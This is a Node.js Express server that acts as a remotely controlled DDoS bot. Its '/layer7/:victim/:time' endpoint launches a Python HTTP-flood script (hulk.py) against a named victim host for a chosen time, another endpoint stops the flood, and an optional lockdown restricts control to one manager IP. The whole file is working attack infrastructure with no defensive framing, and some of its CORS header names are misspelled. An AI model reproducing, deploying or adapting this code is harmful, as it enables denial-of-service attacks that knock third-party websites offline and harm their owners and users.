const express = require('express')
const { spawn } = require('child_process');
const app = express()
const delay = require('delay')
const lockdown = false
const port = 3000 // access port
const managerIP = "" //only IP that can send commands in if lockdown === true.

let machineBusy = false //machine attack state declaration
let pythonActive = false //python state declaration
let python = null //defining python beforehand so we can change it afterwards

app.use((req, res, next) => {
    var ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    var accessedPN = req.originalUrl;
    var accesstype = req.method
    res.setHeader('Acces-Control-Allow-Origin', '*');
    res.setHeader('Acces-Control-Allow-Methods', 'GET,POST,PUT,PATCH,DELETE');
    res.setHeader('Acces-Contorl-Allow-Methods', 'Content-Type', 'Authorization');
    if (lockdown) {
        if (!(ip === managerIP)) {
            res.send(403, { error: "UNAUTHORIZED&_FUCK_OFF" })
        }
    }
    next();
})

app.get('/layer7/:victim/:time', (req, res) => {
    if (!(machineBusy)) {
        let victim = req.params.victim
        let timelimit = req.params.time
        if (isNaN(timelimit)) {
            res.send(405, { error: "INVALID_TIME_LIMIT" })
        }
        else {
            mainT(victim, timelimit)
            machineBusy = true
            res.send(200)
        }
    }
    else {
        res.send(405, { error: "MACHINE_IS_BUSY" })
    }
})

app.get('/layer7stop/', (req, res) => {
    if (pythonActive) {
        python.kill("SIGINT")
        python.kill("SIGTERM")
        machineBusy = false
        pythonActive = false
        res.send(200)
    }
    else {
        res.send(405, { error: "NO_PROCESSES_ACTIVE" })
    }
});

async function mainT(victim, time) {
    if (!(pythonActive)) {
        machineBusy = true
        pythonActive = true
        python = spawn('python2', ['hulk.py', `http://${victim}`]);
        machineBusy = true
        pythonActive = true
        await delay(time * 1000)
        if (pythonActive) {
            python.kill("SIGINT")
            python.kill("SIGTERM")
            console.log("KILLED PYTHON.")
            machineBusy = false
            pythonActive = false
        }
    }
}

app.listen(port, () => console.log(`App listening on port
${port}!`))



